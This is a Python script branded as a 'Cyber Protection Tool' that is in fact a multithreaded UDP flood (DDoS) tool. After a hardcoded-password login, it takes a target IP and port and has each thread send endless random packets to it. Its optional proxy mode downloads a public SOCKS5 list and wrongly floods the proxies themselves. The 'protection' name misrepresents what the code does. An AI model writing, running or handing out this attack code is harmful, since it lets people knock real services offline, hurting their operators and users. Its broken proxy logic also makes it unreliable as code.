import os
import time
import socket
import random
import threading
import requests
from colorama import init, Fore

# Initialize colorama for colored output
init()

# Proxy list URL (example, replace with a working one)
PROXY_LIST_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"

def print_logo():
    os.system("clear")
    print(Fore.GREEN)
    print("   ╔══════════════════════════════════════════════════════════════╗")
    print("   ║                   CYBER PROTECTION TOOL v2.0                 ║")
    print("   ╚══════════════════════════════════════════════════════════════╝")
    print("\n")
    print("   _____      _                 _____           _            _   _              ")
    print("  / ____|    | |               |  __ \\         | |          | | (_)             ")
    print(" | |    _   _| |__   ___ _ __  | |__) | __ ___ | |_ ___  ___| |_ _  ___  _ __   ")
    print(" | |   | | | | '_ \\ / _ \\ '__| |  ___/ '__/ _ \\| __/ _ \\/ __| __| |/ _ \\| '_ \\  ")
    print(" | |___| |_| | |_) |  __/ |    | |   | | | (_) | ||  __/ (__| |_| | (_) | | | | ")
    print("  \\_____\\__, |_.__/ \\___|_|    |_|   |_|  \\___/ \\__\\___|\\___|\\__|_|\\___/|_| |_| ")
    print("         __/ |                                                                 ")
    print("        |___/                                                                 ")
    print(Fore.CYAN)
    print("   ╔══════════════════════════════════════════════════════════════════════╗")
    print("   ║                    DEVELOPER INFORMATION                             ║")
    print("   ╠══════════════════════════════════════════════════════════════════════╣")
    print("   ║  👤 Coded By  : MD Mehadi Hasan (Shuvo)                              ║")
    print("   ║  🖊️ Author     : Cyber Protection                                     ║")
    print("   ║  🔥 Tool Version: 2.0 (Enhanced Edition)                             ║")
    print("   ╚══════════════════════════════════════════════════════════════════════╝")
    print("\n")

def login():
    print(Fore.GREEN)
    print("   ╔════════════════════════════╗")
    print("   ║      LOGIN TO CONTINUE     ║")
    print("   ╚════════════════════════════╝")
    attempts = 0
    while attempts < 3:
        username = input("\n   ➤ Enter Username: ")
        password = input("   ➤ Enter Password: ")
        if username == "cyber_protection" and password == "mehadi0011":
            print("\n   ✅ Login Successful!\n")
            time.sleep(1)
            os.system("clear")
            return True
        else:
            attempts += 1
            print(f"\n   ❌ Invalid Credentials! Attempts Left: {3 - attempts}\n")
    print("\n   ❌ Access Denied! Exiting...\n")
    exit()

def fetch_proxies():
    try:
        response = requests.get(PROXY_LIST_URL)
        proxies = response.text.splitlines()
        return [proxy for proxy in proxies if proxy.strip()]
    except Exception as e:
        print(Fore.RED + f"   ❌ Failed to fetch proxies: {e}")
        return []

def loading_bar():
    print(Fore.RED)
    for i in range(101):
        time.sleep(0.01)
        print(f"\r   ➤ Loading: [{'#' * (i//5)}{' ' * (20 - (i//5))}] {i}%", end='', flush=True)
    print("\n\n")

def get_target_details():
    print(Fore.YELLOW)
    print("   ╔══════════════════════════════════════════╗")
    print("   ║          ENTER TARGET DETAILS            ║")
    print("   ╚══════════════════════════════════════════╝")
    url = input("\n   ➤ Enter Target Website URL (optional): ")
    ip = input("   ➤ Enter Target IP Address: ")
    port = int(input("   ➤ Enter Target Port Number: "))
    threads = int(input("   ➤ Enter Number of Threads (1-100): "))
    print("\n   ✅ Details received successfully.\n")
    return url, ip, port, threads

def ddos_thread(ip, port, proxy=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)
    packet_count = 0
    while True:
        try:
            if proxy:
                # Proxy format: ip:port
                proxy_ip, proxy_port = proxy.split(":")
                sock.sendto(payload, (proxy_ip, int(proxy_port)))
            else:
                sock.sendto(payload, (ip, port))
            packet_count += 1
            print(Fore.MAGENTA + f"   ➤ Thread {threading.current_thread().name} sent packet #{packet_count} to {ip}:{port}")
        except Exception as e:
            print(Fore.RED + f"   ❌ Error in thread {threading.current_thread().name}: {e}")
            break

def start_ddos(ip, port, threads, use_proxy=False):
    print(Fore.CYAN)
    print("   ╔══════════════════════════════════════════╗")
    print("   ║           ENHANCED DDOS ATTACK           ║")
    print("   ╚══════════════════════════════════════════╝")
    print(f"\n   🚀 DDoS Attack started on {ip}:{port} with {threads} threads")
    
    proxies = fetch_proxies() if use_proxy else []
    if use_proxy and not proxies:
        print(Fore.RED + "   ❌ No proxies available. Falling back to direct attack.")
        use_proxy = False
    
    thread_list = []
    for i in range(threads):
        proxy = random.choice(proxies) if use_proxy and proxies else None
        t = threading.Thread(target=ddos_thread, args=(ip, port, proxy), name=f"Thread-{i+1}")
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()

def main():
    print_logo()
    if login():
        loading_bar()
        url, ip, port, threads = get_target_details()
        use_proxy = input("\n   ➤ Use proxies for attack? (y/n): ").lower() == 'y'
        start_ddos(ip, port, threads, use_proxy)
    else:
        print(Fore.RED + "   ❌ Access Denied! Please try logging in again.")

if __name__ == "__main__":
    main()
